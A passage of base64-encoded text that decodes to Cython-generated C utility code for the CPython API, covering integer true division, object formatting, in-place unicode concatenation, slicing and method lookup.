aikpIHtcbiAgICAgICAgdmFsID0gX19QeXhfUHlVbmljb2RlX0FzRG91YmxlKG9iaik7XG4gICAgfSBlbHNlIGlmIChQeUJ5dGVzX0NoZWNrRXhhY3Qob2JqKSkge1xuICAgICAgICB2YWwgPSBfX1B5eF9QeUJ5dGVzX0FzRG91YmxlKG9iaik7XG4gICAgfSBlbHNlIGlmIChQeUJ5dGVBcnJheV9DaGVja0V4YWN0KG9iaikpIHtcbiAgICAgICAgdmFsID0gX19QeXhfUHlCeXRlQXJyYXlfQXNEb3VibGUob2JqKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gUHlOdW1iZXJfRmxvYXQob2JqKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KHZhbCA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG5ub19lcnJvcjpcbiNlbmRpZlxuICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUodmFsKTtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgaW50IGlucGxhY2UpIHtcbiAgICByZXR1cm4gKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZSA6IFB5TnVtYmVyX1RydWVEaXZpZGUpKG9wMSwgb3AyKTtcbn1cbiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX1RydWVEaXZpZGVPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGxvbmcgYSwgeDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzWmVybyhvcDEpKSkge1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Db21wYWN0QXNMb25nKG9wMSwgJmEpKSkge1xuICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhvcDEpO1xuICAgICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChvcDEpO1xuICAgICAgICBzd2l0Y2ggKHNpemUpIHtcbiAgICAgICAgICAgIGNhc2UgLTI6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCAmJiAxICogUHlMb25nX1NISUZUIDwgNTMpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQgJiYgMSAqIFB5TG9uZ19TSElGVCA8IDUzKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUICYmIDIgKiBQeUxvbmdfU0hJRlQgPCA1Mykge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUICYmIDIgKiBQeUxvbmdfU0hJRlQgPCA1Mykge1xuICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUICYmIDMgKiBQeUxvbmdfU0hJRlQgPCA1Mykge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQgJiYgMyAqIFB5TG9uZ19TSElGVCA8IDUzKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGRlZmF1bHQ6IHJldHVybiBQeUxvbmdfVHlwZS50cF9hc19udW1iZXItPm5iX3RydWVfZGl2aWRlKG9wMSwgb3AyKTtcbiAgICAgICAgfVxuICAgIH1cbiAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA8PSA1MyB8fCBsaWtlbHkobGFicyhhKSA8PSAoKFBZX0xPTkdfTE9ORykxIDw8IDUzKSkpXG4gICAgICAgICAgICAgICAgICAgIHx8IF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KG9wMSkgPD0gNTIgLyBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKChkb3VibGUpYSAvIChkb3VibGUpYik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl90cnVlX2RpdmlkZShvcDEsIG9wMik7XG4gICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7XG4gICAgXG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfRmxvYXRfX19QeXhfUHlMb25nX1RydWVEaXZpZGVPYmpDKFB5T2JqZWN0ICpmbG9hdF92YWwsIGxvbmcgaW50dmFsLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTtcbiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7XG4gICAgZG91YmxlIGEgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShmbG9hdF92YWwpO1xuICAgICAgICBkb3VibGUgcmVzdWx0O1xuICAgICAgICBcbiAgICAgICAgcmVzdWx0ID0gKChkb3VibGUpYSkgLyAoZG91YmxlKWI7XG4gICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUocmVzdWx0KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW50dmFsKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgaWYgKFB5RmxvYXRfQ2hlY2tFeGFjdChvcDEpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBpbnR2YWwsIHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBvcDIsIGlucGxhY2UpO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRm9ybWF0KFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBmb3JtYXRfc3BlYykge1xuICAgIGludCByZXQ7XG4gICAgX1B5VW5pY29kZVdyaXRlciB3cml0ZXI7XG4gICAgaWYgKGxpa2VseShQeUZsb2F0X0NoZWNrRXhhY3Qob2JqKSkpIHtcbiAgICAgICAgX1B5VW5pY29kZVdyaXRlcl9Jbml0KCZ3cml0ZXIpO1xuICAgICAgICByZXQgPSBfUHlGbG9hdF9Gb3JtYXRBZHZhbmNlZFdyaXRlcihcbiAgICAgICAgICAgICZ3cml0ZXIsXG4gICAgICAgICAgICBvYmosXG4gICAgICAgICAgICBmb3JtYXRfc3BlYywgMCwgUHlVbmljb2RlX0dFVF9MRU5HVEgoZm9ybWF0X3NwZWMpKTtcbiAgICB9IGVsc2UgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChvYmopKSkge1xuICAgICAgICBfUHlVbmljb2RlV3JpdGVyX0luaXQoJndyaXRlcik7XG4gICAgICAgIHJldCA9IF9QeUxvbmdfRm9ybWF0QWR2YW5jZWRXcml0ZXIoXG4gICAgICAgICAgICAmd3JpdGVyLFxuICAgICAgICAgICAgb2JqLFxuICAgICAgICAgICAgZm9ybWF0X3NwZWMsIDAsIFB5VW5pY29kZV9HRVRfTEVOR1RIKGZvcm1hdF9zcGVjKSk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmV0dXJuIFB5T2JqZWN0X0Zvcm1hdChvYmosIGZvcm1hdF9zcGVjKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KHJldCA9PSAtMSkpIHtcbiAgICAgICAgX1B5VW5pY29kZVdyaXRlcl9EZWFsbG9jKCZ3cml0ZXIpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIF9QeVVuaWNvZGVXcml0ZXJfRmluaXNoKCZ3cml0ZXIpO1xufVxuI2VuZGlmXG5cblxuIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBpbnRcbl9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShQeU9iamVjdCAqdW5pY29kZSlcbntcbiAgICBpZiAoUHlfUkVGQ05UKHVuaWNvZGUpICE9IDEpXG4gICAgICAgIHJldHVybiAwO1xuICAgIGlmICghUHlVbmljb2RlX0NoZWNrRXhhY3QodW5pY29kZSkpXG4gICAgICAgIHJldHVybiAwO1xuICAgIGlmIChQeVVuaWNvZGVfQ0hFQ0tfSU5URVJORUQodW5pY29kZSkpXG4gICAgICAgIHJldHVybiAwO1xuICAgIHJldHVybiAxO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0XG4gICAgICAgICNpZiBDWVRIT05fUkVGTkFOTllcbiAgICAgICAgLCB2b2lkKiBfX3B5eF9yZWZuYW5ueVxuICAgICAgICAjZW5kaWZcbiAgICApIHtcbiAgICBQeU9iamVjdCAqbGVmdCA9ICpwX2xlZnQ7XG4gICAgUHlfc3NpemVfdCBsZWZ0X2xlbiwgcmlnaHRfbGVuLCBuZXdfbGVuO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobGVmdCkgPT0gLTEpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHJpZ2h0KSA9PSAtMSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGxlZnRfbGVuID0gUHlVbmljb2RlX0dFVF9MRU5HVEgobGVmdCk7XG4gICAgaWYgKGxlZnRfbGVuID09IDApIHtcbiAgICAgICAgUHlfSU5DUkVGKHJpZ2h0KTtcbiAgICAgICAgcmV0dXJuIHJpZ2h0O1xuICAgIH1cbiAgICByaWdodF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChyaWdodCk7XG4gICAgaWYgKHJpZ2h0X2xlbiA9PSAwKSB7XG4gICAgICAgIFB5X0lOQ1JFRihsZWZ0KTtcbiAgICAgICAgcmV0dXJuIGxlZnQ7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShsZWZ0X2xlbiA+IFBZX1NTSVpFX1RfTUFYIC0gcmlnaHRfbGVuKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJzdHJpbmdzIGFyZSB0b28gbGFyZ2UgdG8gY29uY2F0Iik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBuZXdfbGVuID0gbGVmdF9sZW4gKyByaWdodF9sZW47XG4gICAgaWYgKF9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShsZWZ0KVxuICAgICAgICAgICAgJiYgUHlVbmljb2RlX0NoZWNrRXhhY3QocmlnaHQpXG4gICAgICAgICAgICAmJiBQeVVuaWNvZGVfS0lORChyaWdodCkgPD0gUHlVbmljb2RlX0tJTkQobGVmdClcbiAgICAgICAgICAgICYmICEoUHlVbmljb2RlX0lTX0FTQ0lJKGxlZnQpICYmICFQeVVuaWNvZGVfSVNfQVNDSUkocmlnaHQpKSkge1xuICAgICAgICBpbnQgcmV0O1xuICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpO1xuICAgICAgICByZXQgPSBQeVVuaWNvZGVfUmVzaXplKHBfbGVmdCwgbmV3X2xlbik7XG4gICAgICAgIF9fUHl4X0dPVFJFRigqcF9sZWZ0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHJldCAhPSAwKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBpZiAodW5saWtlbHkoUHlVbmljb2RlX0NvcHlDaGFyYWN0ZXJzKCpwX2xlZnQsIGxlZnRfbGVuLCByaWdodCwgMCwgcmlnaHRfbGVuKSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfSU5DUkVGKCpwX2xlZnQpO1xuICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpO1xuICAgICAgICByZXR1cm4gKnBfbGVmdDtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0NvbmNhdChsZWZ0LCByaWdodCk7XG4gICAgfVxuICB9XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0U2xpY2UoUHlPYmplY3QqIG9iaixcbiAgICAgICAgUHlfc3NpemVfdCBjc3RhcnQsIFB5X3NzaXplX3QgY3N0b3AsXG4gICAgICAgIFB5T2JqZWN0KiogX3B5X3N0YXJ0LCBQeU9iamVjdCoqIF9weV9zdG9wLCBQeU9iamVjdCoqIF9weV9zbGljZSxcbiAgICAgICAgaW50IGhhc19jc3RhcnQsIGludCBoYXNfY3N0b3AsIENZVEhPTl9VTlVTRUQgaW50IHdyYXBhcm91bmQpIHtcbiAgICBfX1B5eF9UeXBlTmFtZSBvYmpfdHlwZV9uYW1lO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgIFB5TWFwcGluZ01ldGhvZHMqIG1wID0gUHlfVFlQRShvYmopLT50cF9hc19tYXBwaW5nO1xuICAgIGlmIChsaWtlbHkobXAgJiYgbXAtPm1wX3N1YnNjcmlwdCkpXG4jZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0KiByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0ICpweV9zbGljZSwgKnB5X3N0YXJ0LCAqcHlfc3RvcDtcbiAgICAgICAgaWYgKF9weV9zbGljZSkge1xuICAgICAgICAgICAgcHlfc2xpY2UgPSAqX3B5X3NsaWNlO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlPYmplY3QqIG93bmVkX3N0YXJ0ID0gTlVMTDtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBvd25lZF9zdG9wID0gTlVMTDtcbiAgICAgICAgICAgIGlmIChfcHlfc3RhcnQpIHtcbiAgICAgICAgICAgICAgICBweV9zdGFydCA9ICpfcHlfc3RhcnQ7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmIChoYXNfY3N0YXJ0KSB7XG4gICAgICAgICAgICAgICAgICAgIG93bmVkX3N0YXJ0ID0gcHlfc3RhcnQgPSBQeUxvbmdfRnJvbVNzaXplX3QoY3N0YXJ0KTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweV9zdGFydCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIH0gZWxzZVxuICAgICAgICAgICAgICAgICAgICBweV9zdGFydCA9IFB5X05vbmU7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoX3B5X3N0b3ApIHtcbiAgICAgICAgICAgICAgICBweV9zdG9wID0gKl9weV9zdG9wO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdG9wKSB7XG4gICAgICAgICAgICAgICAgICAgIG93bmVkX3N0b3AgPSBweV9zdG9wID0gUHlMb25nX0Zyb21Tc2l6ZV90KGNzdG9wKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweV9zdG9wKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdGFydCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZVxuICAgICAgICAgICAgICAgICAgICBweV9zdG9wID0gUHlfTm9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHB5X3NsaWNlID0gUHlTbGljZV9OZXcocHlfc3RhcnQsIHB5X3N0b3AsIFB5X05vbmUpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdGFydCk7XG4gICAgICAgICAgICBQeV9YREVDUkVGKG93bmVkX3N0b3ApO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweV9zbGljZSkpIGdvdG8gYmFkO1xuICAgICAgICB9XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgICAgIHJlc3VsdCA9IG1wLT5tcF9zdWJzY3JpcHQob2JqLCBweV9zbGljZSk7XG4jZWxzZVxuICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9HZXRJdGVtKG9iaiwgcHlfc2xpY2UpO1xuI2VuZGlmXG4gICAgICAgIGlmICghX3B5X3NsaWNlKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYocHlfc2xpY2UpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIG9ial90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUob2JqKSk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIlwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIG9iamVjdCBpcyB1bnNsaWNlYWJsZSIsIG9ial90eXBlX25hbWUpO1xuICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmpfdHlwZV9uYW1lKTtcbmJhZDpcbiAgICByZXR1cm4gTlVMTDtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKSB7XG4gICAgUHlPYmplY3QgKmFyZ3NbM10gPSB7TlVMTCwgYXJnMSwgYXJnMn07XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmN0aW9uLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCkge1xuICAgIFB5T2JqZWN0ICphdHRyO1xuI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAmJiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQXG4gICAgX19QeXhfVHlwZU5hbWUgdHlwZV9uYW1lO1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgUHlPYmplY3QgKmRlc2NyO1xuICAgIGRlc2NyZ2V0ZnVuYyBmID0gTlVMTDtcbiAgICBQeU9iamVjdCAqKmRpY3RwdHIsICpkaWN0O1xuICAgIGludCBtZXRoX2ZvdW5kID0gMDtcbiAgICBhc3NlcnQgKCptZXRob2QgPT0gTlVMTCk7XG4gICAgaWYgKHVubGlrZWx5KHRwLT50cF9nZXRhdHRybyAhPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICAgICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTtcbiAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkodHAtPnRwX2RpY3QgPT0gTlVMTCkgJiYgdW5saWtlbHkoUHlUeXBlX1JlYWR5KHRwKSA8IDApKSB7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICBkZXNjciA9IF9QeVR5cGVfTG9va3VwKHRwLCBuYW1lKTtcbiAgICBpZiAobGlrZWx5KGRlc2NyICE9IE5VTEwpKSB7XG4gICAgICAgIFB5X0lOQ1JFRihkZXNjcik7XG4jaWYgZGVmaW5lZChQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSAmJiBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SXG4gICAgICAgIGlmIChfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKGRlc2NyKSwgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUikpXG4jZWxzZVxuICAgICAgICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkgfHwgX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhkZXNjcikpKVxuICAgICAgICAjZWxzZVxuICAgICAgICBpZiAobGlrZWx5KFB5RnVuY3Rpb25fQ2hlY2soZGVzY3IpIHx8IF9fUHl4X0lTX1RZUEUoZGVzY3IsICZQeU1ldGhvZERlc2NyX1R5cGUpKSlcbiAgICAgICAgI2VuZGlmXG4jZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgbWV0aF9mb3VuZCA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBmID0gUHlfVFlQRShkZXNjciktPnRwX2Rlc2NyX2dldDtcbiAgICAgICAgICAgIGlmIChmICE9IE5VTEwgJiYgUHlEZXNjcl9Jc0RhdGEoZGVzY3IpKSB7XG4gICAgICAgICAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgICAgIGdvdG8gdHJ5X3VucGFjaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH1cbiAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiAgICBpZiAoZGljdHB0ciAhPSBOVUxMICYmIChkaWN0ID0gKmRpY3RwdHIpICE9IE5VTEwpIHtcbiAgICAgICAgUHlfSU5DUkVGKGRpY3QpO1xuICAgICAgICBhdHRyID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIoZGljdCwgbmFtZSk7XG4gICAgICAgIGlmIChhdHRyICE9IE5VTEwpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihhdHRyKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWN0KTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihkaWN0KTtcbiAgICB9XG4gICAgaWYgKG1ldGhfZm91bmQpIHtcbiAgICAgICAgKm1ldGhvZCA9IGRlc2NyO1xuICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4gICAgaWYgKGYgIT0gTlVMTCkge1xuICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpO1xuICAgICAgICBQeV9